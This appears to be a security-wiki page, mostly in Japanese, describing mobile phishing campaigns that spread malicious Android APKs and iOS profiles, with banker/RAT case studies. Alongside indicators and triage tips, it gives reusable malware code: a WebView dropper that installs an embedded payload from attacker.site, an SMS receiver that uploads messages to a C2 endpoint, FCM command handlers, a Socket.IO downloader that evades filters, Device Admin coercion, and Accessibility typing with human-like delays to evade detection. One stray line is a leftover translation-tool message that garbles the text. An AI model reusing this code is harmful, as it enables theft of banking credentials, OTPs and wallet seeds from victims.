# モバイルフィッシング & マルウェア的アプリ配布 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページは、フィッシング（SEO、ソーシャルエンジニアリング、偽ストア、出会い系アプリ等）を通じて **malicious Android APKs** と **iOS mobile-configuration profiles** を配布するために脅威アクターが使う手法を扱います。
> 資料は Zimperium zLabs（2025）が暴露した SarangTrap キャンペーンやその他の公開研究を元に適応しています。

## 攻撃フロー

1. **SEO/Phishing インフラ**
* 多数の類似ドメイン（出会い系、クラウド共有、カーサービスなど）を登録。
– `<title>` 要素に現地言語のキーワードや絵文字を使って Google でのランクを狙う。
– Android（`.apk`）と iOS のインストール手順の両方を同一ランディングページにホストする。
2. **ファーストステージダウンロード**
* Android: *unsigned* または “third-party store” の APK への直接リンク。
* iOS: `itms-services://` または plain HTTPS リンクで悪意ある **mobileconfig** プロファイルへ（下参照）。
3. **インストール後のソーシャルエンジニアリング**
* 初回起動時にアプリは **invitation / verification code** を要求（限定アクセスの錯覚を与える）。
* コードは **HTTP で POST** されて Command-and-Control (C2) に送信される。
* C2 が `{"success":true}` を返す ➜ マルウェア動作が進行。
* 有効なコードを送らないサンドボックス/AV の動的解析は **悪意ある挙動を検出しない**（回避）。
4. **実行時の権限悪用** (Android)
* 危険な permission は **C2 の肯定応答後** にのみ要求される:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 最近のバリアントは `AndroidManifest.xml` から SMS 用の `<uses-permission>` を **削除** するが、Java/Kotlin のコード経路はリフレクションで SMS を読む処理を残している ⇒ 静的スコアを下げつつ、AppOps の悪用や古いターゲットでは依然機能する。
5. **フサード UI とバックグラウンド収集**
* アプリはローカルに実装された無害なビュー（SMS ビューア、ギャラリーピッカー）を表示する。
* 同時に以下を送信する:
- IMEI / IMSI、電話番号
- `ContactsContract` のフルダンプ（JSON 配列）
- `/sdcard/DCIM` からの JPEG/PNG を [Luban](https://github.com/Curzibn/Luban) で圧縮してサイズ削減
- オプションで SMS 内容（`content://sms`）
ペイロードは **バッチで zip 圧縮** され `HTTP POST /upload.php` 経由で送信される。
6. **iOS 配布手法**
* 単一の **mobile-configuration profile** が `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等を要求して、デバイスを MDM ライクな監視状態に登録できる。
* ソーシャルエンジニアリング手順例:
1. Settings を開く ➜ *Profile downloaded*。
2. ページ上のスクリーンショット通りに *Install* を3回タップ。
3. 署名されていないプロファイルを信頼 ➜ 攻撃者は App Store レビューなしに *Contacts* と *Photo* の権限を得る。
7. **ネットワーク層**
* 平文 HTTP、しばしばポート80、HOST ヘッダは `api.<phishingdomain>.com` のようなもの。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS がないため検出しやすい）。

## Red-Team 向けヒント

* **Dynamic Analysis Bypass** – マルウェア評価時に Frida/Objection で invitation code フェーズを自動化して悪意ある分岐に到達する。
* **Manifest vs. Runtime Diff** – `aapt dump permissions` と実行時の `PackageManager#getRequestedPermissions()` を比較；危険な権限が欠けているのはレッドフラッグ。
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE` を設定して、コード入力後の不自然な POST バーストを検出する。
* **mobileconfig Inspection** – macOS で `security cms -D -i profile.mobileconfig` を使い `PayloadContent` を一覧化して過剰な権限を検出する。

## 便利な Frida スニペット: 招待コード自動バイパス

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## インジケーター（一般）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink経由の動的エンドポイント検出
- Malwareはshortlinkからプレーンテキストのカンマ区切りの稼働中エンドポイント一覧を取得し、単純な文字列変換で最終的なphishingページのパスを生成する。

例（サニタイズ済み）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
擬似コード:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebViewベースの UPI credential harvesting
- 「Make payment of ₹1 / UPI‑Lite」ステップは、動的エンドポイントから攻撃者の HTML フォームを WebView 内に読み込み、機密フィールド（電話番号、銀行、UPI PIN）を取得して `addup.php` に `POST` します。

最小ローダー:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation と SMS/OTP 傍受
- 初回実行時に過剰な権限を要求する:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 連絡先をループ処理して、被害者のデバイスからsmishing SMSを一斉送信する。
- 着信SMSはbroadcast receiverによって傍受され、metadata（sender、body、SIM slot、per-device random ID）とともに`/addsm.php`にアップロードされる。

Receiver スケッチ:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) を耐障害性のある C2 として
- payload は FCM に登録され、プッシュメッセージは `_type` フィールドを持ち、スイッチとして動作をトリガーします（例: phishing テキストテンプレートの更新、振る舞いの切り替え）。

例: FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
ハンドラーの概要:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### インジケーター/IOCs
- APK は副次ペイロードを `assets/app.apk` に含む
- WebView は `gate.htm` から支払いを読み込み、`/addup.php` に外部送信する
- SMS を `/addsm.php` へ外部送信
- ショートリンク駆動の設定取得（例: `rebrand.ly/*`）で CSV エンドポイントを返す
- 一般的な「Update/Secure Update」とラベル付けされたアプリ
- 信頼できないアプリで `_type` 判別子を持つ FCM `data` メッセージ

---

## Socket.IO/WebSocket ベースの APK すり抜け + 偽の Google Play ページ

攻撃者は静的な APK リンクを、Google Play 風の誘導ページに埋め込まれた Socket.IO/WebSocket チャンネルで置き換えることが増えています。これによりペイロード URL が隠蔽され、URL/拡張子フィルターを回避し、現実的なインストール UX を維持します。

実際に観察された典型的なクライアントフロー:

<details>
<summary>Socket.IO 偽 Play ダウンローダー (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

なぜ簡単な制御を回避するのか:
- 静的な APK URL は公開されない; payload は WebSocket frames からメモリ上で再構築される。
- 直接の .apk レスポンスをブロックする URL/MIME/拡張子フィルタは、WebSockets/Socket.IO を経由してトンネリングされたバイナリデータを見逃す可能性がある。
- WebSockets を実行しないクローラや URL サンドボックスは payload を取得できない。

参照: WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn のケーススタディ

RatOn banker/RAT campaign (ThreatFabric) は、現代のモバイル phishing オペレーションが WebView droppers、Accessibility-driven UI automation、overlays/ransom、Device Admin coercion、Automated Transfer System (ATS)、crypto wallet takeover、さらには NFC-relay orchestration を組み合わせる具体例である。本節では再利用可能な手法を抽象化する。

### Stage-1: WebView → native install bridge (dropper)
攻撃者は攻撃者ページを指す WebView を表示し、native installer を公開する JavaScript インターフェイスを注入する。HTML button をタップすると native code が呼ばれ、dropper の assets にバンドルされた second-stage APK をインストールして直接起動する。

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
翻訳する対象のファイル内容が提示されていません。src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md の該当部分（Markdown/HTML）を貼り付けてください。タグやリンク、コードは翻訳せずそのまま残します。
```html
<button onclick="bridge.installApk()">Install</button>
```
インストール後、dropper は明示的な package/activity 経由で payload を起動します:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility programmatically helps accept later prompts by finding buttons like “Allow”/“OK” in the node-tree and dispatching clicks.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
参照:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView を使った Overlay phishing/ransom
オペレーターは以下のコマンドを発行できる:
- URL からフルスクリーンのオーバーレイを表示する、または
- インラインHTMLを渡して WebView のオーバーレイに読み込ませる。

想定される用途: 強要（PIN入力）、ウォレットを開かせてPINを取得する、身代金メッセージ送信。オーバーレイ権限がない場合に付与を確認するコマンドを用意しておくこと。

### Remote control model – テキスト擬似スクリーン + screen-cast
- Low-bandwidth: 定期的に Accessibility ノードツリーをダンプし、表示されているテキスト/roles/bounds をシリアライズして疑似スクリーンとして C2 に送信する（例: 一度だけの `txt_screen`、継続的な `screen_live`）。
- High-fidelity: MediaProjection を要求し、必要に応じて screen-casting/recording を開始する（例: `display` / `record`）。

### ATS playbook (bank app automation)
JSON タスクを受け取り、銀行アプリを起動し、Accessibility を使ってテキスト検索や座標タップを組み合わせて UI を操作し、要求されたら被害者の支払いPINを入力する。

例のタスク:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
あるターゲットフローで見られた例文 (CZ → EN):
- "Nová platba" → "新しい支払い"
- "Zadat platbu" → "支払いを入力"
- "Nový příjemce" → "新しい受取人"
- "Domácí číslo účtu" → "国内口座番号"
- "Další" → "次へ"
- "Odeslat" → "送信"
- "Ano, pokračovat" → "はい、続行"
- "Zaplatit" → "支払う"
- "Hotovo" → "完了"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
対象例: MetaMask、Trust Wallet、Blockchain.com、Phantom。  
フロー: アンロック（盗まれた PIN または提供されたパスワード）、Security/Recovery に移動、シードフレーズを表示、keylog/exfiltrate it。EN/RU/CZ/SK を考慮したロケール対応セレクタを実装し、言語間でのナビゲーションを安定させる。

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- 現在の認証情報を期限切れにして変更を強制する (Accessibility が新しい PIN/パスワードを取得する):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard の生体認証機能を無効化して生体認証以外でのロック解除を強制する:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
注意: 最近の Android では多くの DevicePolicyManager コントロールが Device Owner/Profile Owner を必要とする; 一部の OEM ビルドは緩い場合がある。ターゲットの OS/OEM 上で必ず検証すること。

### NFC relay orchestration (NFSkate)
Stage-3 は外部の NFC-relay モジュール（例: NFSkate）をインストール・起動し、中継中に被害者を誘導するための HTML テンプレートを渡すことさえ可能。これにより、オンライン ATS と並行した非接触カードプレゼントのキャッシュアウトが可能になる。

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (インライン HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

脅威アクターはますます Accessibility 駆動の自動化と、基本的な行動バイオメトリクスに対する検知回避を組み合わせている。最近の banker/RAT は、相補的な2つのテキスト配信モードと、ランダム化されたケイデンスで人間のタイピングを模倣するためのオペレータトグルを備えている。

- Discovery mode: 操作前にセレクタと bounds で可視ノードを列挙し、入力を正確にターゲットする（ID、text、contentDescription、hint、bounds）。
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` を直接ターゲットノードに適用（安定、キーボード不要）
- Mode 2 – クリップボード設定 + `ACTION_PASTE` をフォーカスされたノードに実行（直接 setText がブロックされる場合に有効）
- Human-like cadence: オペレータが提供した文字列を分割し、イベント間でランダム化された300–3000 ms の遅延を挟んで1文字ずつ送信し、「machine-speed typing」ヒューリスティクスを回避する。実装は `ACTION_SET_TEXT` で値を段階的に増加させる方法、または1文字ずつ貼り付ける方法のいずれか。

<details>
<summary>Java スケッチ: ノード検出 + setText または clipboard+paste を使った文字毎の遅延入力</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

詐欺を隠すためのブロッキングオーバーレイ：
- オペレータが制御する不透明度でフルスクリーンの `TYPE_ACCESSIBILITY_OVERLAY` をレンダリングする。リモート自動化が背後で進行している間、被害者には不透明なままにしておく。
- 一般的に公開されるコマンド: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

アルファを調整可能な最小限のオーバーレイ：
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
オペレータ制御プリミティブによく見られるもの: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y`（スクリーン共有）。

## 参考資料

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
